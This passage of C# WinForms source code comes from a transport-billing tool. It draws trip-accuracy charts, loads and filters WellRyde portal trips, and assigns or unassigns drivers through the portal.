            int padH = card.Padding.Left + card.Padding.Right;
            bool paddingShrinksClient = padH > 0 && card.ClientSize.Width <= card.Width - padH + 2;
            int x = paddingShrinksClient ? 0 : horizontalInset;
            int w = paddingShrinksClient
                ? Math.Max(4, client.Width)
                : Math.Max(4, client.Width - horizontalInset * 2);
            label.SetBounds(x, y, w, labelH);
        }

        private void TabPage4_LayoutTimeCorrectionPanels(object sender, EventArgs e)
        {
            LayoutTimeCorrectionBottomPanels();
        }

        private void RefreshAccuracyChart()
        {
            if (mcTimeCorrectionTool == null || tcchart == null || tcchart.IsDisposed)
                return;

            TimeCorrectionAccuracySnapshot snapshot = mcTimeCorrectionTool.CalculateAccuracySnapshot();
            DrawAccuracyChart(snapshot.Drivers);
            ApplyCompanyAccuracyLabel(snapshot);
        }

        private void ApplyCompanyAccuracyLabel(TimeCorrectionAccuracySnapshot snapshot)
        {
            if (tcchart == null || tcchart.IsDisposed)
                return;

            tcchart.Titles.Clear();

            string text;
            Color color = Color.Gainsboro;
            if (snapshot == null || snapshot.TotalLegs == 0)
            {
                text = "Company accuracy: —";
            }
            else
            {
                string datePart = string.IsNullOrWhiteSpace(snapshot.ServiceDateLabel)
                    ? ""
                    : " · " + snapshot.ServiceDateLabel;
                text = "Company" + datePart + ": " + snapshot.CompanyAccuracyPercent.ToString("0") + "%" +
                    "  |  " + snapshot.AccurateLegs + "/" + snapshot.TotalLegs + " legs" +
                    "  |  " + snapshot.PassedTrips + "/" + snapshot.TotalTrips + " trips passed";
                color = snapshot.CompanyAccuracyPercent >= 70 ? Color.LightGreen : Color.Salmon;
            }

            var title = new Title
            {
                Name = "CompanyAccuracy",
                Text = text,
                Docking = Docking.Top,
                IsDockedInsideChartArea = false,
                Alignment = System.Drawing.ContentAlignment.TopRight,
                ForeColor = color,
                Font = new Font("Segoe UI", 9.5F, FontStyle.Bold, GraphicsUnit.Point),
                BackColor = Color.Transparent,
            };
            tcchart.Titles.Add(title);
        }

        private async Task LoadBtnAsync(MCBatchLink link)
        {

                    RefreshAccuracyChart();

                    tctripcorrectlv.Items.Clear();
                    foreach (MCBatchTripRecord triprcd in mcTimeCorrectionTool.mcBatchRecords.MCBatchTrips)
                    {
                        triprcd.BatchLink = link.BatchLinkToken;
                        ListViewItem lvi = new ListViewItem();
                        lvi.Text = triprcd.Status;


                        lvi.SubItems.Add(triprcd.Date + "-" + triprcd.Trip);
                        lvi.SubItems.Add(triprcd.Alerts);
                        lvi.SubItems.Add(triprcd.Driver);
                        lvi.SubItems.Add(FormatTimeOnly(triprcd.ScheduledPUTime));
                        lvi.SubItems.Add(FormatTimeOnly(triprcd.ScheduledDOTime));
                        lvi.SubItems.Add(FormatTimeOnly(triprcd.PUTime));
                        lvi.SubItems.Add(FormatTimeOnly(triprcd.DOTime));
                        lvi.SubItems.Add(FormatTimeOnly(triprcd.SuggestedPUTime));
                        lvi.SubItems.Add(FormatTimeOnly(triprcd.SuggestedDOTime));
                        //if &nbsp; found replace with empty space
                        if (triprcd.RiderCallTime.Contains("&nbsp;"))
                        {
                            lvi.SubItems.Add("");
                        }
                        else
                        {
                            lvi.SubItems.Add(FormatTimeOnly(triprcd.RiderCallTime));
                        }
                        if (triprcd.Vehicle.Contains("&nbsp;"))
                        {
                            lvi.SubItems.Add("");
                        }
                        else
                        {
                            lvi.SubItems.Add(triprcd.Vehicle);
                        }
                        lvi.SubItems.Add(triprcd.SignatureReceived);
                        lvi.SubItems.Add(triprcd.CoPay);
                        lvi.SubItems.Add(triprcd.BilledAmount);
                        lvi.SubItems.Add(triprcd.RequiresAttention);
                        tctripcorrectlv.Items.Add(lvi);
                    }
                    int fixabletripscounter = 0;
                    foreach (MCBatchTripRecord mctrprcd in mcTimeCorrectionTool.mcBatchRecords.MCBatchTrips)
                    {
                        if (mctrprcd.Status == "Fixable")
                        {
                            fixabletripscounter += 1;
                        }
                    }


            int timelefsecs = (fixabletripscounter * 10);
            TimeSpan ts = TimeSpan.FromSeconds(timelefsecs);
            tctripcorrectlv.Columns[2].Text = "Alerts: " + mcTimeCorrectionTool.ReturnAlertCount().ToString();
            ListViewMinWidthEnforcer.ScheduleRecompute(tctripcorrectlv);
            string modeLabel = ShortTimeCorrectionLoadModeLabel(mcTimeCorrectionTool.LoadMode);
            string portalAudit = mcTimeCorrectionTool.BuildPortalAssignmentAuditSummaryCompact();
            tcstatustext = "Batch " + link.BatchID + " (" + modeLabel + "): " + fixabletripscounter + " fixable";
            if (!string.IsNullOrWhiteSpace(portalAudit))
                tcstatustext += " · " + portalAudit;
            SetTimeCorrectionStatus(tcstatustext, ts);
            ListViewMinWidthEnforcer.ScheduleRecompute(tctripcorrectlv);
        }

        private TimeCorrectionLoadMode? PromptTimeCorrectionLoadMode()
        {
            UseWaitCursor = true;
            try
            {
                using (var dlg = new TimeCorrectionLoadModeForm())
                {
                    if (dlg.ShowDialog(this) != DialogResult.OK)
                        return null;
                    return dlg.SelectedMode;
                }
            }
            finally
            {
                UseWaitCursor = false;
            }
        }

        //Wellryde billing
        private async void billloadButton_Click(object sender, EventArgs e)
        {
            ShowLoadingGif();
            try
            {
                await SetLoadingGifLabel("Loading trips");
                WellRydePortalFilterDataResult reloadResult;
                int portalTotalRecords;
                try
                {
                    (reloadResult, portalTotalRecords) = await ReloadBillingTripsFromPortalWithAuthRetryAsync();
                }
                catch (Exception ex)
                {
                    MessageBox.Show("WellRyde filterdata: " + ex.Message);
                    return;
                }
                if (!reloadResult.IsSuccess)
                {
                    var prefix = reloadResult.StatusCode.HasValue
                        ? "HTTP " + (int)reloadResult.StatusCode.Value + " — "
                        : "";
                    MessageBox.Show(prefix + (reloadResult.ErrorMessage ?? "filterdata failed."));
                    return;
                }

                _billingSubmitPending = false;
                BindBillingListViewFromWrTool(0, false, false);
                RefreshBillingCharts();
                var trips = wrBillingTool.WRTripList;
                if (portalTotalRecords > 0 && trips != null && trips.Count != portalTotalRecords)
                {
                    billingstatuslbl.Text = "Status: WellRyde reports " + portalTotalRecords + " trips; " + trips.Count +
                        " rows parsed for " + rjDatePicker1.Value.ToLongDateString() + ". " +
                        wrBillingTool.WRCalculations.CalculateBillableTripCount(billingmmcb.CheckState, billingallcb.CheckState) +
                        " billable, $" + wrBillingTool.WRCalculations.CalculateActualBillTotal(billingmmcb.CheckState, billingallcb.CheckState) + ".";
                }
            }
            finally
            {
                hidegiftimer.Start();
            }
        }

        /// <summary>
        /// Display-only formatter for time columns. If <paramref name="value"/> parses as a
        /// <see cref="DateTime"/> (e.g. "5/16/2026 8:30:00 AM" coming back from WellRyde), returns
        /// just the time portion ("8:30 AM"). Otherwise returns the input unchanged so already-formatted
        /// strings, "&amp;nbsp;" placeholders, and arbitrary text pass through untouched.
        /// </summary>
        /// <remarks>
        /// Operates on the string handed to a <see cref="ListViewItem"/> only — the underlying
        /// <c>WRDownloadedTrip</c> / <c>MCDownloadedTrip</c> / <c>MCBatchTripRecord</c> time fields
        /// keep their original values for any consumer that depends on them.
        /// </remarks>
        private static string FormatTimeOnly(string value)
        {
            if (string.IsNullOrWhiteSpace(value)) return value ?? string.Empty;
            var parsed = SupeyTripTimes.TryParse(value);
            if (parsed.HasValue)
            {
                return DateTime.Today.Add(parsed.Value)
                    .ToString("h:mm tt", System.Globalization.CultureInfo.InvariantCulture);
            }
            if (DateTime.TryParse(value, System.Globalization.CultureInfo.CurrentCulture,
                    System.Globalization.DateTimeStyles.None, out var dt))
            {
                return dt.ToString("h:mm tt", System.Globalization.CultureInfo.InvariantCulture);
            }
            return value;
        }

        // Trip Scout — independent WellRyde trip pull / display, does not share state with the Billing tab.
        private async void tsloadbtn_Click(object sender, EventArgs e)
        {
            if (tsloadbtn != null) tsloadbtn.Enabled = false;
            if (tssearchbox != null) tssearchbox.Enabled = false;
            string dayLabel = tsdatepicker.Value.ToLongDateString();
            StartTripScoutStatusSpinner("Status: Trip Scout loading trips for " + dayLabel + "...");
            try
            {
                await Task.Yield();

                WellRydePortalFilterDataResult fd;
                List<WRDownloadedTrip> trips;
                int portalTotalRecords;
                try
                {
                    UpdateTripScoutStatus("Status: Connecting to WellRyde for " + dayLabel + "...");
                    (fd, trips, portalTotalRecords) = await LoadWellRydeTripsForDateWithAuthRetryAsync(tsdatepicker.Value);
                }
                catch (Exception ex)
                {
                    StopTripScoutStatusSpinner("Status: WellRyde filterdata error — " + ex.Message);
                    MessageBox.Show("WellRyde filterdata: " + ex.Message);
                    return;
                }

                if (!fd.IsSuccess)
                {
                    var prefix = fd.StatusCode.HasValue ? "HTTP " + (int)fd.StatusCode.Value + " — " : "";
                    var msg = prefix + (fd.ErrorMessage ?? "filterdata failed.");
                    StopTripScoutStatusSpinner("Status: " + msg);
                    MessageBox.Show(msg);
                    return;
                }

                _tripScoutAllTrips = trips ?? new List<WRDownloadedTrip>();
                // A fresh date load invalidates any prior search; clearing the box re-binds the
                // unfiltered list via the TextChanged handler. Suppress that side-effect once so we
                // don't double-bind.
                _suppressTripScoutSearch = true;
                try { tssearchbox.Text = ""; }
                finally { _suppressTripScoutSearch = false; }
                UpdateTripScoutStatus("Status: Rendering " + _tripScoutAllTrips.Count + " trips for " + dayLabel + "...");
                BindTripScoutListView(_tripScoutAllTrips, fitColumns: !_tripScoutColumnsAutoFitDone);
                _tripScoutColumnsAutoFitDone = true;

                int loadedCount = _tripScoutAllTrips.Count;
                if (portalTotalRecords > 0 && loadedCount != portalTotalRecords)
                {
                    StopTripScoutStatusSpinner("Status: WellRyde reports " + portalTotalRecords + " trips; " +
                        loadedCount + " rows parsed for " + tsdatepicker.Value.ToLongDateString() + ".");
                }
                else
                {
                    StopTripScoutStatusSpinner("Status: " + loadedCount + " trips loaded for " +
                        tsdatepicker.Value.ToLongDateString() + ".");
                }
            }
            finally
            {
                StopTripScoutStatusSpinner(keepCurrentText: true);
                if (tsloadbtn != null) tsloadbtn.Enabled = true;
                if (tssearchbox != null) tssearchbox.Enabled = true;
            }
        }

        /// <summary>
        /// Auto-load Trip Scout once per app run (first open of the tab), defaulting the picker to today.
        /// Subsequent tab visits keep the existing loaded results unless the user manually clicks Load.
        /// </summary>
        private void EnsureTripScoutFirstUseLoad()
        {
            if (_tripScoutFirstLoadTriggered)
                return;
            if (hiatmeTabControl == null || hiatmeTabControl.SelectedTab != tabPage9)
                return;

            _tripScoutFirstLoadTriggered = true;
            if (tsdatepicker != null)
                tsdatepicker.Value = DateTime.Today;

            BeginInvoke((MethodInvoker)(() => tsloadbtn_Click(tsloadbtn, EventArgs.Empty)));
        }

        private void StartTripScoutStatusSpinner(string statusText)
        {
            _tripScoutStatusBaseMessage = statusText ?? "Status: Loading...";
            PushTripScoutLoading(_tripScoutStatusBaseMessage);
            if (_tripScoutStatusSpinnerTimer == null)
            {
                _tripScoutStatusSpinnerTimer = new System.Windows.Forms.Timer { Interval = 130 };
                _tripScoutStatusSpinnerTimer.Tick += (s, e) =>
                {
                    _tripScoutStatusSpinnerTick = (_tripScoutStatusSpinnerTick + 1) % 8;
                    RenderTripScoutSpinnerLabel();
                };
            }
            _tripScoutStatusSpinnerTick = 0;
            RenderTripScoutSpinnerLabel();
            _tripScoutStatusSpinnerTimer.Start();
        }

        private void UpdateTripScoutStatus(string statusText)
        {
            _tripScoutStatusBaseMessage = statusText ?? "";
            SetTripScoutLoadingMessage(_tripScoutStatusBaseMessage);
            if (_tripScoutStatusSpinnerTimer != null && _tripScoutStatusSpinnerTimer.Enabled)
                RenderTripScoutSpinnerLabel();
            else if (tsstatuslbl != null)
                tsstatuslbl.Text = _tripScoutStatusBaseMessage;
        }

        private void StopTripScoutStatusSpinner(string finalStatus = null, bool keepCurrentText = false)
        {
            _tripScoutStatusSpinnerTimer?.Stop();
            PopTripScoutLoading();
            if (keepCurrentText || tsstatuslbl == null)
                return;
            if (!string.IsNullOrWhiteSpace(finalStatus))
                tsstatuslbl.Text = finalStatus;
            else
                tsstatuslbl.Text = _tripScoutStatusBaseMessage ?? "";
        }

        private void EnsureTripScoutLoadingOverlay()
        {
            if (tslv == null || tslv.IsDisposed) return;
            var host = tslv.Parent;
            if (host == null || host.IsDisposed) return;

            if (_tripScoutLoadingOverlay != null && !_tripScoutLoadingOverlay.IsDisposed &&
                !ReferenceEquals(_tripScoutLoadingOverlay.Parent, host))
            {
                _tripScoutLoadingOverlay.Dispose();
                _tripScoutLoadingOverlay = null;
            }

            if (_tripScoutLoadingOverlay == null || _tripScoutLoadingOverlay.IsDisposed)
            {
                _tripScoutLoadingOverlay = new SupeyMapLoadingOverlay
                {
                    Visible = false,
                    Anchor = AnchorStyles.None
                };
                host.Controls.Add(_tripScoutLoadingOverlay);
                tslv.Resize += (s, e) => SyncTripScoutLoadingOverlayBounds();
                tslv.LocationChanged += (s, e) => SyncTripScoutLoadingOverlayBounds();
                tslv.VisibleChanged += (s, e) => SyncTripScoutLoadingOverlayBounds();
                host.Resize += (s, e) => SyncTripScoutLoadingOverlayBounds();
                host.ControlAdded += (s, e) =>
                {
                    if (_tripScoutLoadingDepth > 0)
                        _tripScoutLoadingOverlay?.BringToFront();
                };
            }

            SyncTripScoutLoadingOverlayBounds();
        }

        private void SyncTripScoutLoadingOverlayBounds()
        {
            if (_tripScoutLoadingOverlay == null || _tripScoutLoadingOverlay.IsDisposed || tslv == null || tslv.IsDisposed)
                return;

            _tripScoutLoadingOverlay.Bounds = tslv.Bounds;
        }

        private void PushTripScoutLoading(string message = null)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new Action(() => PushTripScoutLoading(message)));
                return;
            }

            EnsureTripScoutLoadingOverlay();
            if (_tripScoutLoadingOverlay == null) return;

            if (!string.IsNullOrWhiteSpace(message))
                _tripScoutLoadingOverlay.Message = message.Trim();

            _tripScoutLoadingDepth++;
            if (_tripScoutLoadingDepth == 1)
            {
                SyncTripScoutLoadingOverlayBounds();
                _tripScoutLoadingOverlay.Visible = tslv != null && tslv.Visible;
                _tripScoutLoadingOverlay.IsAnimating = true;
                _tripScoutLoadingOverlay.BringToFront();
            }
        }

        private void PopTripScoutLoading()
        {
            if (InvokeRequired)
            {
                BeginInvoke(new Action(PopTripScoutLoading));
                return;
            }

            if (_tripScoutLoadingDepth <= 0 || _tripScoutLoadingOverlay == null || _tripScoutLoadingOverlay.IsDisposed)
                return;

            _tripScoutLoadingDepth--;
            if (_tripScoutLoadingDepth == 0)
            {
                _tripScoutLoadingOverlay.IsAnimating = false;
                _tripScoutLoadingOverlay.Visible = false;
            }
        }

        private void SetTripScoutLoadingMessage(string message)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new Action(() => SetTripScoutLoadingMessage(message)));
                return;
            }

            if (string.IsNullOrWhiteSpace(message) || _tripScoutLoadingDepth <= 0)
                return;

            EnsureTripScoutLoadingOverlay();
            if (_tripScoutLoadingOverlay == null || _tripScoutLoadingOverlay.IsDisposed)
                return;

            _tripScoutLoadingOverlay.Message = message.Trim();
            _tripScoutLoadingOverlay.BringToFront();
        }

        private void RenderTripScoutSpinnerLabel()
        {
            if (tsstatuslbl == null)
                return;
            char[] frames = { '◴', '◷', '◶', '◵', '◴', '◷', '◶', '◵' };
            char frame = frames[_tripScoutStatusSpinnerTick % frames.Length];
            tsstatuslbl.Text = frame + " " + (_tripScoutStatusBaseMessage ?? "");
        }

        private void analyzer_loading_update(string text)
        {
            var msg = string.IsNullOrWhiteSpace(text) ? "Status: Working..." : "Status: " + text.Trim();
            UpdateAnalyzerStatus(msg);
        }

        private void analyzer_loading_show()
        {
            StartAnalyzerStatusSpinner("Status: Working...");
        }

        private void analyzer_loading_hide()
        {
            StopAnalyzerStatusSpinner(keepCurrentText: true);
        }

        private void StartAnalyzerStatusSpinner(string statusText)
        {
            _analyzerLoadingBaseMessage = statusText ?? "Status: Working...";
            PushAnalyzerLoading(_analyzerLoadingBaseMessage);
            if (aastatuslbl != null)
                aastatuslbl.Text = _analyzerLoadingBaseMessage;
        }

        private void UpdateAnalyzerStatus(string statusText)
        {
            _analyzerLoadingBaseMessage = statusText ?? "";
            SetAnalyzerLoadingMessage(_analyzerLoadingBaseMessage);
            if (aastatuslbl != null)
                aastatuslbl.Text = _analyzerLoadingBaseMessage;
        }

        private void StopAnalyzerStatusSpinner(string finalStatus = null, bool keepCurrentText = false)
        {
            PopAnalyzerLoading();
            if (keepCurrentText || aastatuslbl == null)
                return;
            if (!string.IsNullOrWhiteSpace(finalStatus))
                aastatuslbl.Text = finalStatus;
            else
                aastatuslbl.Text = _analyzerLoadingBaseMessage ?? "";
        }

        private void EnsureAnalyzerLoadingOverlay()
        {
            if (aalv == null || aalv.IsDisposed) return;
            var host = aalv.Parent;
            if (host == null || host.IsDisposed) return;

            if (_analyzerLoadingOverlay != null && !_analyzerLoadingOverlay.IsDisposed &&
                !ReferenceEquals(_analyzerLoadingOverlay.Parent, host))
            {
                _analyzerLoadingOverlay.Dispose();
                _analyzerLoadingOverlay = null;
            }

            if (_analyzerLoadingOverlay == null || _analyzerLoadingOverlay.IsDisposed)
            {
                _analyzerLoadingOverlay = new SupeyMapLoadingOverlay
                {
                    Visible = false,
                    Anchor = AnchorStyles.None
                };
                host.Controls.Add(_analyzerLoadingOverlay);
                aalv.Resize += (s, e) => SyncAnalyzerLoadingOverlayBounds();
                aalv.LocationChanged += (s, e) => SyncAnalyzerLoadingOverlayBounds();
                aalv.VisibleChanged += (s, e) => SyncAnalyzerLoadingOverlayBounds();
                host.Resize += (s, e) => SyncAnalyzerLoadingOverlayBounds();
                host.ControlAdded += (s, e) =>
                {
                    if (_analyzerLoadingDepth > 0)
                        _analyzerLoadingOverlay?.BringToFront();
                };
            }

            SyncAnalyzerLoadingOverlayBounds();
        }

        private void SyncAnalyzerLoadingOverlayBounds()
        {
            if (_analyzerLoadingOverlay == null || _analyzerLoadingOverlay.IsDisposed || aalv == null || aalv.IsDisposed)
                return;

            _analyzerLoadingOverlay.Bounds = aalv.Bounds;
        }

        private void PushAnalyzerLoading(string message = null)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new Action(() => PushAnalyzerLoading(message)));
                return;
            }

            EnsureAnalyzerLoadingOverlay();
            if (_analyzerLoadingOverlay == null) return;

            if (!string.IsNullOrWhiteSpace(message))
                _analyzerLoadingOverlay.Message = message.Trim();

            _analyzerLoadingDepth++;
            if (_analyzerLoadingDepth == 1)
            {
                SyncAnalyzerLoadingOverlayBounds();
                _analyzerLoadingOverlay.Visible = aalv != null && aalv.Visible;
                _analyzerLoadingOverlay.IsAnimating = true;
                _analyzerLoadingOverlay.BringToFront();
            }
        }

        private void PopAnalyzerLoading()
        {
            if (InvokeRequired)
            {
                BeginInvoke(new Action(PopAnalyzerLoading));
                return;
            }

            if (_analyzerLoadingDepth <= 0 || _analyzerLoadingOverlay == null || _analyzerLoadingOverlay.IsDisposed)
                return;

            _analyzerLoadingDepth--;
            if (_analyzerLoadingDepth == 0)
            {
                _analyzerLoadingOverlay.IsAnimating = false;
                _analyzerLoadingOverlay.Visible = false;
            }
        }

        private void SetAnalyzerLoadingMessage(string message)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new Action(() => SetAnalyzerLoadingMessage(message)));
                return;
            }

            if (string.IsNullOrWhiteSpace(message) || _analyzerLoadingDepth <= 0)
                return;

            EnsureAnalyzerLoadingOverlay();
            if (_analyzerLoadingOverlay == null || _analyzerLoadingOverlay.IsDisposed)
                return;

            _analyzerLoadingOverlay.Message = message.Trim();
            _analyzerLoadingOverlay.BringToFront();
        }

        /// <summary>True while a programmatic <see cref="tssearchbox"/> mutation is in progress.</summary>
        private bool _suppressTripScoutSearch;

        /// <summary>
        /// Live filter for <see cref="tslv"/>. Empty query shows the full master list; otherwise
        /// case-insensitive substring match across the most useful WellRyde fields. We never
        /// re-fetch from the portal here — only re-bind the in-memory <see cref="_tripScoutAllTrips"/>.
        /// </summary>
        private void tssearchbox_TextChanged(object sender, EventArgs e)
        {
            if (_suppressTripScoutSearch) return;
            ApplyTripScoutFilter(tssearchbox.Text);
        }

        /// <summary>
        /// Applies <paramref name="query"/> against <see cref="_tripScoutAllTrips"/> and rebinds the
        /// listview. Skips the min-width recompute so the user's column widths don't jump on every
        /// keystroke.
        /// </summary>
        private void ApplyTripScoutFilter(string query)
        {
            if (_tripScoutAllTrips == null || _tripScoutAllTrips.Count == 0)
            {
                BindTripScoutListView(new List<WRDownloadedTrip>());
                tsstatuslbl.Text = "Status: No trips loaded. Pick a date and click Load.";
                return;
            }

            string trimmed = (query ?? "").Trim();
            List<WRDownloadedTrip> visible;
            if (trimmed.Length == 0)
            {
                visible = _tripScoutAllTrips;
            }
            else
            {
                visible = new List<WRDownloadedTrip>(_tripScoutAllTrips.Count);
                foreach (var trip in _tripScoutAllTrips)
                {
                    if (MatchesTripScoutFilter(trip, trimmed)) visible.Add(trip);
                }
            }

            BindTripScoutListView(visible);

            string dateStr = tsdatepicker.Value.ToLongDateString();
            if (trimmed.Length == 0)
            {
                tsstatuslbl.Text = "Status: " + _tripScoutAllTrips.Count + " trips loaded for " + dateStr + ".";
            }
            else
            {
                tsstatuslbl.Text = "Status: " + visible.Count + " of " + _tripScoutAllTrips.Count +
                    " trips match \"" + trimmed + "\" for " + dateStr + ".";
            }
        }

        /// <summary>
        /// Case-insensitive substring match across the searchable WellRyde trip fields.
        /// Touches only display-relevant strings — leaves UUID/internal IDs out so users don't
        /// match unintended hashes.
        /// </summary>
        private static bool MatchesTripScoutFilter(WRDownloadedTrip trip, string query)
        {
            if (trip == null) return false;
            if (FieldContains(trip.TripNumber, query)) return true;
            if (FieldContains(trip.ClientName, query)) return true;
            if (FieldContains(trip.DriverName, query)) return true;
            if (FieldContains(trip.Status, query)) return true;
            if (FieldContains(trip.PUStreet, query)) return true;
            if (FieldContains(trip.PUCity, query)) return true;
            if (FieldContains(trip.DOStreet, query)) return true;
            if (FieldContains(trip.DOCITY, query)) return true;
            if (FieldContains(trip.PUPhone, query)) return true;
            if (FieldContains(trip.DOPhone, query)) return true;
            if (FieldContains(trip.References, query)) return true;
            if (FieldContains(trip.Comments, query)) return true;
            if (FieldContains(trip.Miles, query)) return true;
            if (FieldContains(trip.Price, query)) return true;
            if (trip.Alerts != null)
            {
                foreach (var alert in trip.Alerts)
                {
                    if (FieldContains(alert, query)) return true;
                }
            }
            return false;
        }

        private static bool FieldContains(string field, string query)
        {
            if (string.IsNullOrEmpty(field)) return false;
            return field.IndexOf(query, StringComparison.OrdinalIgnoreCase) >= 0;
        }

        /// <summary>Roster cached on first context-menu open so we don't refetch /portal/getAllDriversForTripAssignment for every right-click.</summary>
        private List<WRDrivers> _tripScoutDriverRoster;

        /// <summary>
        /// Tag/dim the right-click menu items based on the current selection. Without a selection the
        /// portal calls have nothing to act on, so both items are disabled and labeled to make that obvious.
        /// </summary>
        private void tsTripContextMenu_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
            int n = tslv.SelectedItems.Count;
            bool hasSel = n > 0;
            tsTripCtxAssign.Enabled = hasSel;
            tsTripCtxUnassign.Enabled = hasSel;
            if (n <= 1)
            {
                tsTripCtxAssign.Text = "Assign to driver...";
                tsTripCtxUnassign.Text = "Unassign trip";
            }
            else
            {
                tsTripCtxAssign.Text = "Assign " + n + " trips to driver...";
                tsTripCtxUnassign.Text = "Unassign " + n + " trips";
            }

            // Locate is single-driver only and requires the picked row to actually have a driver
            // assigned (the AVL feed only knows about active drivers, not the trip itself).
            string driverForLocate = GetSingleSelectedDriverNameForLocate();
            tsTripCtxLocate.Enabled = !string.IsNullOrWhiteSpace(driverForLocate);
            tsTripCtxLocate.Text = string.IsNullOrWhiteSpace(driverForLocate)
                ? "Locate driver on map"
                : "Locate " + driverForLocate + " on map";
        }

        /// <summary>Driver name to label/lookup for the right-click "Locate" item, or null if the selection isn't actionable.</summary>
        private string GetSingleSelectedDriverNameForLocate()
        {
            var sel = GetSelectedTripScoutTrips();
            if (sel.Count != 1) return null;
            string name = sel[0].DriverName;
            return string.IsNullOrWhiteSpace(name) ? null : name.Trim();
        }

        /// <summary>
        /// Right-click → Assign to driver. Pulls (and caches) the WellRyde driver roster, lets the
        /// user pick one in <see cref="DriverPickerForm"/>, then sends
        /// <c>assignTrips → assignValidation → assignTripDriver</c> for every selected row.
        /// On success, in-memory <see cref="WRDownloadedTrip.DriverName"/> is patched and the visible
        /// rows are re-rendered so the user sees the assignment without having to re-click Load.
        /// </summary>
        private async void tsTripCtxAssign_Click(object sender, EventArgs e)
        {
            var selectedTrips = GetSelectedTripScoutTrips();
            if (selectedTrips.Count == 0) return;

            if (!await EnsureWellRydePortalSessionForBillingAsync() || _wellRydeSession == null)
            {
                MessageBox.Show("WellRyde portal session is not available.", "Trip Scout",
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            ShowLoadingGif();
            try
            {
                if (_tripScoutDriverRoster == null || _tripScoutDriverRoster.Count == 0)
                {
                    await SetLoadingGifLabel("Loading driver list");
                    try
                    {
                        _tripScoutDriverRoster = await _wellRydeSession.GetAllDriversForTripAssignmentAsync().ConfigureAwait(true);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("Failed to load drivers: " + ex.Message, "Trip Scout",
                            MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        return;
                    }
                }

                if (_tripScoutDriverRoster == null || _tripScoutDriverRoster.Count == 0)
                {
                    MessageBox.Show("WellRyde returned no drivers.", "Trip Scout",
                        MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }
            }
            finally
            {
                hidegiftimer.Start();
            }

            string contextLine = selectedTrips.Count == 1
                ? "Assigning trip " + (selectedTrips[0].TripNumber ?? "(no id)")
                : "Assigning " + selectedTrips.Count + " trips";

            WRDrivers picked;
            using (var dlg = new DriverPickerForm(_tripScoutDriverRoster, contextLine))
            {
                if (dlg.ShowDialog(this) != DialogResult.OK) return;
                picked = dlg.SelectedDriver;
            }
            if (picked == null) return;

            var uuids = new List<string>(selectedTrips.Count);
            foreach (var trip in selectedTrips)
            {
                if (!string.IsNullOrWhiteSpace(trip.TripUUID)) uuids.Add(trip.TripUUID);
            }
            if (uuids.Count == 0)
            {
                MessageBox.Show("Selected trips are missing portal UUIDs; cannot assign.", "Trip Scout",
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            ShowLoadingGif();
            try
            {
                await SetLoadingGifLabel("Assigning " + uuids.Count + " trip" + (uuids.Count == 1 ? "" : "s") +
                    " to " + (picked.text ?? "driver"));

                WellRydePortalTripMutationResult result;
                try
                {
                    result = await _wellRydeSession.PostAssignTripsToDriverAsync(picked.value, uuids).ConfigureAwait(true);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Assign failed: " + ex.Message, "Trip Scout",
                        MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                if (!result.IsSuccess)
                {
                    MessageBox.Show("WellRyde rejected the assignment.\n\n" +
                        (result.ErrorMessage ?? "(no error message)"),
                        "Trip Scout", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                string newDriverName = picked.text ?? "";
                foreach (var trip in selectedTrips)
                {
                    trip.DriverName = newDriverName;
                }
                RefreshTripScoutListViewKeepingFilter();
                tsstatuslbl.Text = "Status: Assigned " + uuids.Count + " trip" + (uuids.Count == 1 ? "" : "s") +
                    " to " + newDriverName + ".";
            }
            finally
            {
                hidegiftimer.Start();
            }
        }

        /// <summary>
        /// Right-click → Unassign trip(s). Confirms first (this is destructive on the portal side),
        /// then sends <c>unAssignValidation → unassign</c>. Patches in-memory driver name to empty
        /// so the row UI reflects the change without a full reload.
        /// </summary>
        private async void tsTripCtxUnassign_Click(object sender, EventArgs e)
        {
            var selectedTrips = GetSelectedTripScoutTrips();
            if (selectedTrips.Count == 0) return;

            string prompt = selectedTrips.Count == 1
                ? "Unassign trip " + (selectedTrips[0].TripNumber ?? "(no id)") +
                    " from " + (string.IsNullOrWhiteSpace(selectedTrips[0].DriverName) ? "(no driver)" : selectedTrips[0].DriverName) + "?"
                : "Unassign " + selectedTrips.Count + " trips from their current drivers?";
            if (MessageBox.Show(prompt, "Confirm unassign", MessageBoxButtons.OKCancel, MessageBoxIcon.Question) != DialogResult.OK)
                return;

            if (!await EnsureWellRydePortalSessionForBillingAsync() || _wellRydeSession == null)
            {
                MessageBox.Show("WellRyde portal session is not available.", "Trip Scout",
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            var uuids = new List<string>(selectedTrips.Count);
            foreach (var trip in selectedTrips)
            {
                if (!string.IsNullOrWhiteSpace(trip.TripUUID)) uuids.Add(trip.TripUUID);
            }
            if (uuids.Count == 0)
            {
                MessageBox.Show("Selected trips are missing portal UUIDs; cannot unassign.", "Trip Scout",
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            ShowLoadingGif();
            try
            {
                await SetLoadingGifLabel("Unassigning " + uuids.Count + " trip" + (uuids.Count == 1 ? "" : "s"));

                WellRydePortalTripMutationResult result;
                try
                {
                    result = await _wellRydeSession.PostUnassignTripsAsync(uuids).ConfigureAwait(true);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Unassign failed: " + ex.Message, "Trip Scout",
                        MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                if (!result.IsSuccess)
                {
                    MessageBox.Show("WellRyde rejected the unassignment.\n\n" +
                        (result.ErrorMessage ?? "(no error message)"),
                        "Trip Scout", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                foreach (var trip in selectedTrips)
                {
                    trip.DriverName = "";
                }
                RefreshTripScoutListViewKeepingFilter();
                tsstatuslbl.Text = "Status: Unassigned " + uuids.Count + " trip" + (uuids.Count == 1 ? "" : "s") + ".";
            }
            finally
            {
                hidegiftimer.Start();
            }
        }

